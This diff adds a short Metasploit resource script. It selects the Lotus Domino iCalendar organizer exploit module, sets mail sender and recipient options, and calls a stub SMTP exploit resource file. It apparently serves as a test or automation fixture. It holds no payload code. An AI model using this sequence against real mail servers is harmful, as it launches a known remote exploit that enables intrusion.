@@ -1,0 +1,4 @@
+use exploits/windows/lotus/domino_icalendar_organizer
+set MAILFROM nobody@remotehost
+set MAILTO root@localhost
+resource stub_smtp_explt_rhost.rb
